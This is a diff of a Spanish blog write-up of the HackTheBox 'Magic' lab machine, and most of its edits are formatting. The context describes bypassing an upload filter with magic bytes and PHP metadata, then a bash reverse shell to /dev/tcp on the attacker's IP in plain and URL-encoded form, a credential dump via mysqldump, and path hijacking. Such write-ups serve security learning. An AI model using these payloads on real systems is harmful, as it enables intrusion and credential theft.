@@ -1,8 +1,10 @@
 ---
 layout      : post
 title       : "HackTheBox - Magic"
+author      : lanz
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/bannermagic.png
 categories  : [ htb ]
+tags        : [ magic-bytes, path-hijacking, file-upload ]
 ---
 Máquina Linux nivel medio. Inspeccionaremos un redireccionamiento web algo locochon, moveremos algunos Magic Bytes, iremos jugando con MySQL y haremos un Path Hijacking.
 
@@ -16,7 +18,7 @@ Máquina Linux nivel medio. Inspeccionaremos un redireccionamiento web algo loco
 
 Como es habitual, vemos que servicios está corriendo la maquina, en este caso con los parámetros normales el escaneo va lento, así que le agregamos algunos para evitarlo.
 
-```sh
+```bash
 $ nmap -p- --open -v -n --min-rate=5000 10.10.10.185 -oG initScan
 ```
 
@@ -37,7 +39,7 @@ Con la función que maneja [s4vitar](https://s4vitar.github.io/) podemos extraer
 
 La ejecución es sencilla, solo se debe agregar la función al archivo `$ ~/.bashrc`
 
-```sh
+```bash
 $ extractPorts initScan
 ```
 
@@ -45,7 +47,7 @@ $ extractPorts initScan
 
 Ahora un escaneo para verificar las versiones y scripts que están manejando los servicios encontrados, en este caso el SSH(22) y el HTTP(80).
 
-```sh
+```bash
 $ nmap -sC -sV -p22,80 10.10.10.185 -oN portScan
 ```
 
@@ -68,7 +70,7 @@ Vemos varias imágenes y algunos gif, nada relevante, vamos al apartado `login.p
 
 El login no tiene nada interesante. Decido hacer un reconocimiento por fuerza bruta con [dirsearch](https://github.com/maurosoria/dirsearch) a ver si hay algo escondido por ahí.
 
-```sh
+```bash
 $ dirsearch.py -u http://10.10.10.185/ -E -x 403
 ```
 
@@ -118,7 +120,7 @@ Dando clic en **Forward** responde
 
 Pues NO, no es tan fácil. Tomando en cuenta algunos CTF y el nombre de la máquina *Magic* caí en cuenta de los **Magic Numbers** de los archivos. Básicamente son signaturas que establecen que tipo de archivo se está trabajando, se identifican viendo el archivo en formato hexadecimal, el tipo de archivo lo dictaran generalmente los primeros 4 bytes 
 
-* Pequeña info sobre [magic numbers](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5). 
+* [Pequeña info sobre **magic numbers**](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5). 
 
 Así que cambiando los primeros bytes usando `$ hexeditor` por los correspondientes a un archivo JPEG: 
 
@@ -153,8 +155,8 @@ Consultando por internet, encontré que se pueden usar los metadatos para ejecut
 * [img-upload-rce-cheat-sheet](https://ironhackers.es/herramientas/img-upload-rce-cheat-sheet/)
 * [ocultar-codigo-php-en-una-imagen](http://underc0deblog.blogspot.com/2015/04/ocultar-codigo-php-en-una-imagen.html)
 
-#### 1. Obtener cualquier imagen
-#### 2. Agregar metadato malicioso
+##### 1. Obtener cualquier imagen
+##### 2. Agregar metadato malicioso
 
 Imagen antes:
 
@@ -166,9 +168,9 @@ Imagen después de insertar el tag modificado:
 
 > Va el código php que permitira desde la misma url (GET) pasarle la instrucción a ejecutar en el sistema.
 
-* **__halt_compiler()** hace que el servidor no ejecute los datos de la propia imagen
+* **__halt_compiler()** hace que el servidor no ejecute los datos de la propia imagen.
 
-#### 3. Cambiar la extensión de la imagen de `.jpg` a `.php.jpg` y subirla
+##### 3. Cambiar la extensión de la imagen de `.jpg` a `.php.jpg` y subirla
 
 ![page23upload](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/page23upload.png)
 
@@ -176,13 +178,13 @@ Imagen después de insertar el tag modificado:
 
 Perfecto, podemos ejecutar comandos, ahora intentaremos obtener una Shell reversa. 
 
-```sh
+```bash
 http://10.10.10.185/images/uploads/23.php.jpg?cmd=bash -c 'bash -i >& /dev/tcp/10.10.15.69/1233 0>&1'
 ```
 
 Pero no hace nada, pasando la consulta a URL Encode, quedaría así:
 
-```sh
+```bash
 http://10.10.10.185/images/uploads/23.php.jpg?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.69%2F1233%200%3E%261%27
 ```
 
@@ -192,7 +194,7 @@ Listo, estamos dentro :)
 
 Lo siguiente (óptimo, necesario, preferible) es hacer tratamiento de la tty (entorno de entrada y salida de texto), ya que la Shell que tenemos no es completamente interactiva, acá me apoyo de s4vitar (aún no me aprendo los pasos :P)
 
-* [Video de s4vitar explicando](https://www.youtube.com/watch?v=amKkzk-yP14&t=953)
+* [Video de s4vitar explicando](https://www.youtube.com/watch?v=amKkzk-yP14&t=953).
 
 Y ahora a enumerar... Hay varios archivos interesantes en `$ ls /var/www/Magic`.
 
@@ -206,13 +208,13 @@ Pero probando `$ su theseus` no es válida. Así que no va por ahí (por no leer
 
 Pero de los archivos el unico interesante es `db.php5` que claramente nos tiene que servir para algo ya que tiene credenciales.
 
-Revisandolo bien (ahora si) se ve que la conexion la esta haciendo a una base de datos **MySQL**, pero el sistema al hacer `$ mysql` no lo reconoce, asi que primero intente hacer una conexion remota por medio de ssh, pero no servia, despues de buscar formas no encontre nada, asi que simplemente hice el auto completado normal cuando se quiere evitar escribir toda la instruccion o programa, entonces al hacer **`$ mysql` + TAB TAB**, me mostro varias opciones que se pueden usar mediante mysql.
+Revisandolo bien (ahora si) se ve que la conexion la esta haciendo a una base de datos **MySQL**, pero el sistema al hacer `$ mysql` no lo reconoce, asi que primero intente hacer una conexion remota por medio de ssh, pero no servia, despues de buscar formas no encontre nada, asi que simplemente hice el auto completado normal cuando se quiere evitar escribir toda la instruccion o programa, entonces al hacer **`$ mysql + TAB TAB`**, me mostro varias opciones que se pueden usar mediante mysql.
 
 ![rsmysqltabtab](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsmysqltabtab.png)
 
 Hay varias opciones, leyendo en internet sobre algunas interesantes encontré:
 
-```sh
+```bash
 $ mysqlshow -u theseus -p 
 ```
 
@@ -224,15 +226,17 @@ Pero de acá no puedo encontrar info que me sirva para explotar el servicio.
 
 Tambien hay un programa que me permite extraer un tipo de backup de la creacion de tablas, data y de la propia base de datos. Como cuando se hace un **export** de una base de datos en MySQL Admin.
 
-```sh
+```bash
 $ mysqldump -u theseus -p Magic
 ```
 
-Magic, que sería la base de datos encontrada con `$ mysqlshow`
+Magic, que sería la base de datos encontrada con `$ mysqlshow`.
 
 ![rsmysqldump](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsmysqldump.png)
 
 En las ultimas instrucciones se ve que ingresa a la base de datos un usuario llamado **admin** con una contraseña. Si usamos esa password con el usuario **theseus** logramos obtener una shell con él. 
+
+...
 
 ## Escalada de privilegios
 
@@ -246,9 +250,9 @@ Para ver que hace por detras y como puede estar haciendolo se pueden usar varias
 
 Como se ve esta ejecutando 4 instrucciones, entre ellas `$ fdisk` (ayuda a la gestion y administracion del espacio en el disco duro). Con 3 de esas aplicaciones puedo lograr la explotacion y escalada de privilegios, basicamente por que la tarea esta siendo llamada por el usuario `root`, asi que todas las tareas tendran ese plus. El metodo de explotacion se llama **path hijacking**.
 
-Basicamente lo que hace es que como siempre al ejecutar algun programa el sistema va a buscarlo en algun directorio del path `$ echo $PATH`, entonces (en este ejemplo) pueda que `fdisk` este en `/usr/bin/fdisk`, el atacante se aprovecha de eso agregando en el **path** algun directorio donde **él** tenga un archivo llamado `fdisk` con **instrucciones que hagan lo que el quiera**
+Basicamente lo que hace es que como siempre al ejecutar algun programa el sistema va a buscarlo en algun directorio del path `$ echo $PATH`, entonces (en este ejemplo) pueda que `fdisk` este en `/usr/bin/fdisk`, el atacante se aprovecha de eso agregando en el **path** algun directorio donde **él** tenga un archivo llamado `fdisk` con **instrucciones que hagan lo que el quiera**.
 
-* Otra explicación: [linux-privilege-escalation-using-path-variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
+* [Otra explicación: linux-privilege-escalation-using-path-variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).
 
 Pero como todo se aprende y se entiende en la practica, vamo a darle. La explotacion es sencilla, encontrarla me llevo un tiempito :P 
 
